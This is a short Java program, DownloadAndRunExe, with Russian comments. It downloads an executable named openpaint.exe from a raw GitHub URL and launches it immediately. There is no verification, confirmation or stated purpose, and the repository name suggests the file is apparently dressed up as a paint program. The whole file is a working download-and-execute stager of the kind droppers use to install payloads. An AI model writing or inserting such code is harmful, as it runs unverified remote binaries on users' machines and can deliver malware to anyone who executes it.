import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class DownloadAndRunExe {
    public static void main(String[] args) {
        String exeUrl = "https://raw.githubusercontent.com/BobrKurwa/paint.py3/main/openpaint.exe";
        String localFilePath = "openpaint.exe";

        try {
            // Загрузка exe файла
            URL url = new URL(exeUrl);
            URLConnection connection = url.openConnection();
            InputStream inputStream = connection.getInputStream();
            FileOutputStream outputStream = new FileOutputStream(localFilePath);

            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            inputStream.close();
            outputStream.close();

            System.out.println("Exe файл загружен успешно.");

            // Запуск exe файла
            ProcessBuilder processBuilder = new ProcessBuilder(localFilePath);
            Process process = processBuilder.start();

            System.out.println("Exe файл запущен.");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
